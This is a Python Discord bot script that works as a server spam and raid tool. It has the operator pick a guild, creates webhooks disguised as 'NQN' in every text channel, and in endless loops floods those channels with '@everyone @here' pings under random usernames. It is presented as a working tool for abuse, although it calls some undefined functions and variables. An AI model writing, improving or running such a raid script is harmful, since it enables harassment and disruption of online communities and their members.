@bot.event
async def tesst():
  while True:
    hooks = [channel for channel in await guild.webhooks() if channel.user == bot.user]
    for hook in hooks:
      if not hook == None:        
        value = random.randint(0,9999999999999)      
        await hook.send(content="@everyone @here", username=value)
        print(f"send done {toplit}")
        tas()
    await asyncio.sleep(0.5)

@bot.event
async def runrunasdfas():
  while True:
    for channel in guild.text_channels:
      hook = discord.utils.get(await channel.webhooks(), user=bot.user)   
      if hook == None:
          await channel.create_webhook(name="NQN")

@bot.event
async def taska():
  while True:
    [channel for channel in guild.text_channels if discord.utils.get(await channel.webhooks(), user=bot.user) == None]
            


@bot.event
async def on_ready():
  lol = bot.guilds
  for s, i in enumerate(lol, 1):
    print(s)
    print(i.name)
    print(i.id)
    print(f"{i.member_count} members")
    print()
  x = input("guild position here : ")
  th = input("Thread : ")
  x = int(x) - 1
  x = lol[int(x)]
  global guild
  guild = bot.get_guild(x.id)
  bot.loop.create_task(status_task())
  for i in range(int(th)):
    bot.loop.create_task(runrunasdfas())
    bot.loop.create_task(tesst())
    await asyncio.sleep(3)


keep_alive()
bot.run(TOKEN)
